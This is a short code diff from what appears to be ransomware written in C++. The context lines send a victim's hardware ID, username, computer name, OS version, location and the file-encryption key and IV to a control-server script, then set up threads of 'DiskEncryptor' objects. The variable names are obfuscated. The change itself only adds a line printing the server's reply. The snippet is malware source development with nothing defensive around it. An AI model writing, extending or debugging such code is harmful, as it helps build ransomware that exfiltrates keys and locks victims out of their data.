@@ -63,7 +63,8 @@ int main(void) {
 	CryptoPP::StringSource(iv.data(), iv.size(), true, new CryptoPP::HexEncoder(new CryptoPP::StringSink(dbhzgdzdgzm)));
 	http.SendPostRequest(L"localhost", L"/server/hdhohzuag.php?action=add", L"Content-Type: application/x-www-form-urlencoded\r\n", "uuid=" + sys.getHwId() + "&username=" + sys.getUsername() + "&computername=" + sys.getComputerName() + "&osversion=" + sys.getOsVersion() + "&country=" + data[0] + "&region=" + data[3] + "&city=" + data[1] + "&key=" + ddzdzjd + "&iv=" + dbhzgdzdgzm + "&latlong=" + data[2] + "&langId=" + sys.getLangId());
 	std::string response = http.GetResponseText();	
-
+	std::cout << response << std::endl;
+	
 	std::vector<std::thread> threads;
 	std::vector<DiskEncryptor> toEncrypt;
 	
